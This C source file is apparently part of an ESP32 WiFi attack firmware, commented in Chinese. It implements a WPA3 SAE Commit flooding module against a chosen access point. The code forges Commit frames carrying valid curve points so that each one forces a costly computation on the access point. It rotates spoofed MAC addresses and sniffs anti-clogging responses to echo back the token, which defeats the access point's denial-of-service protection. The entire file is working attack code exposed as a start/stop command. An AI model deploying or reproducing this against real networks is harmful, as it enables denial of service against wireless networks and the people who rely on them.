// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// SAE Commit 洪泛（WPA3）。每帧都要 AP 做一次标量乘，而且不用等握手完成。
// AP 要求 anti-clogging token 时把 token 抄回来再发，否则它连算都不算。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"

#define OWNER "sae"
#define STATUS_ANTI_CLOGGING 76
#define TOKEN_MAX 64
// 一个身份连着发几帧就换 MAC：token 和 SAE 状态都是按站点存的，换身份就全部重来
#define FRAMES_PER_IDENTITY 4
#define TOKEN_SLOTS 4

typedef struct {
    uint8_t mac[6];
    uint8_t token[TOKEN_MAX];
    uint8_t token_len;
} token_slot_t;

static bool s_active;
static bool s_rx_on;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static bool s_real_point = true;
static token_slot_t s_tokens[TOKEN_SLOTS];
static uint32_t s_token_count;
static uint8_t s_identity[6];
static uint32_t s_identity_frames;
static uint32_t s_identities;
static uint32_t s_frames;
static uint32_t s_responses;
static uint32_t s_echoed;
static uint16_t s_last_status;

static token_slot_t *token_find(const uint8_t mac[6], bool create) {
    token_slot_t *free_slot = NULL;
    for (int i = 0; i < TOKEN_SLOTS; i++) {
        if (memcmp(s_tokens[i].mac, mac, 6) == 0) {
            return &s_tokens[i];
        }
        if (free_slot == NULL && s_tokens[i].token_len == 0) {
            free_slot = &s_tokens[i];
        }
    }
    if (!create) {
        return NULL;
    }
    // 槽位满了就抢第 0 个：正在用的那个反而最可能是过期的
    token_slot_t *slot = (free_slot != NULL) ? free_slot : &s_tokens[0];
    memcpy(slot->mac, mac, 6);
    slot->token_len = 0;
    return slot;
}

// 混杂回调上下文，只做解析和拷贝，别在这儿干活
static void on_rx(const uint8_t *frame, uint16_t len, const hal_wifi_rx_meta_t *meta, void *ctx) {
    (void)meta;
    (void)ctx;
    if (!s_active || len < 32) {
        return;
    }
    // 驱动给的 len 含 4 字节 FCS
    const uint16_t body_len = (uint16_t)(len - 4);
    const uint8_t type = (uint8_t)((frame[0] >> 2) & 0x03);
    const uint8_t subtype = (uint8_t)((frame[0] >> 4) & 0x0F);
    if (type != 0 || subtype != 0x0B || body_len < 32) {
        return;
    }
    const uint16_t algorithm = wf_le16(frame + 24);
    const uint16_t seq = wf_le16(frame + 26);
    const uint16_t status = wf_le16(frame + 28);
    if (algorithm != 3 || seq != 1) {
        return;
    }
    s_responses++;
    s_last_status = status;
    if (status != STATUS_ANTI_CLOGGING || body_len < 34) {
        return;
    }
    // status=76 的响应：group(2) 之后全是 token
    const uint8_t *token = frame + 32;
    size_t token_len = (size_t)body_len - 32;
    if (token_len > TOKEN_MAX) {
        token_len = TOKEN_MAX;
    }
    token_slot_t *slot = token_find(frame + 10, true);
    memcpy(slot->token, token, token_len);
    slot->token_len = (uint8_t)token_len;
    s_token_count++;
}

static void sae_tick(uint32_t now_ms) {
    (void)now_ms;
    if (!s_active) {
        return;
    }
    static uint8_t frame[WF_FRAME_CAP];

    if (s_identity_frames >= FRAMES_PER_IDENTITY) {
        attack_random_mac(s_identity);
        s_identity_frames = 0;
        s_identities++;
    }
    s_identity_frames++;

    uint8_t scalar[ATTACK_SAE_SCALAR_LEN];
    uint8_t element[ATTACK_SAE_ELEMENT_LEN];
    attack_sae_fill(scalar, element, s_real_point);

    const token_slot_t *slot = token_find(s_identity, false);
    const bool with_token = (slot != NULL && slot->token_len > 0);
    const int len = attack_build_sae_commit_tok(
        frame, sizeof(frame), s_bssid, s_identity, s_bssid, with_token ? slot->token : NULL,
        with_token ? slot->token_len : 0, scalar, element);
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (with_token) {
            s_echoed++;
        }
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "elem", .type = WB_T_STR, .required = false, .def_str = "point"},
};

static esp_err_t sae_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    const char *elem = wb_args_str(args, "elem");
    if (strcmp(elem, "point") != 0 && strcmp(elem, "rand") != 0) {
        wb_reply_fail(reply, "elem 只能是 point（合法曲线点）或 rand（随机字节，当对照）");
        return ESP_ERR_INVALID_ARG;
    }

    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_real_point = (strcmp(elem, "point") == 0);
    memset(s_tokens, 0, sizeof(s_tokens));
    s_token_count = 0;
    s_identity_frames = 0;
    s_identities = 1;
    s_frames = 0;
    s_responses = 0;
    s_echoed = 0;
    s_last_status = 0;
    attack_random_mac(s_identity);

    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    // 收 AP 回的 status=76，token 就在里面
    if (!s_rx_on && hal_wifi_sniffer_enable(true) == ESP_OK &&
        hal_wifi_rx_subscribe(on_rx, NULL) == ESP_OK) {
        s_rx_on = true;
    }
    s_active = true;
    attack_emit("sae", true, "ch=%u", (unsigned)s_channel);
    wb_reply_line(reply, "sae 开跑 ch=%u elem=%s%s", (unsigned)s_channel, elem,
                  ap.sae ? "" : "（这个 AP 的 beacon 里没看到 SAE，白打的可能性很大）");
    return ESP_OK;
}

static void sae_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    if (s_rx_on) {
        hal_wifi_rx_unsubscribe(on_rx);
        s_rx_on = false;
    }
    attack_unpin(OWNER);
    attack_emit("sae", false, NULL);
}

static esp_err_t sae_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t identities = s_identities;
    const uint32_t responses = s_responses;
    const uint32_t tokens = s_token_count;
    const uint32_t echoed = s_echoed;
    const uint16_t status = s_last_status;
    sae_stop();
    attack_report_rate(reply, "sae", frames);
    wb_reply_line(reply, "identities=%u responses=%u tokens=%u echoed=%u last=%u",
                  (unsigned)identities, (unsigned)responses, (unsigned)tokens,
                  (unsigned)echoed, (unsigned)status);
    return ESP_OK;
}

static esp_err_t sae_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kBcast[6] = WF_BROADCAST_ADDR_INIT;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    uint8_t frame[WF_FRAME_CAP];

    const uint8_t *bssid = (s_bssid[0] != 0) ? s_bssid : kBcast;
    uint8_t scalar[ATTACK_SAE_SCALAR_LEN];
    uint8_t element[ATTACK_SAE_ELEMENT_LEN];
    attack_sae_fill(scalar, element, true);
    int len = attack_build_sae_commit(frame, sizeof(frame), bssid, kSta, bssid, scalar, element);
    if (len <= 0) {
        wb_reply_fail(reply, "Commit 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "commit len=%d algo=%u seq=%u group=%u", len,
                  (unsigned)wf_le16(frame + 24), (unsigned)wf_le16(frame + 26),
                  (unsigned)wf_le16(frame + 30));

    const uint8_t token[8] = {0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8};
    len = attack_build_sae_commit_tok(frame, sizeof(frame), bssid, kSta, bssid, token,
                                      sizeof(token), scalar, element);
    if (len <= 0) {
        wb_reply_fail(reply, "带 token 的 Commit 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "with-token len=%d token_at=%u head=0x%02X", len,
                  (unsigned)(30 + 2), frame[32]);
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", sae_start, "idx=1..64 [elem=point|rand]", kStartPolicy, 2},
    {"stop", sae_stop_cmd, "", NULL, 0},
    {"test", sae_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "sae",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t sae_frames(void) {
    return s_frames;
}

static bool sae_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "sae",
    .object = &kObject,
    .stop = sae_stop,
    .tick = sae_tick,
    .frames = sae_frames,
    .active = sae_active,
};

const attack_driver_t *sae_attack(void) {
    return &kDriver;
}
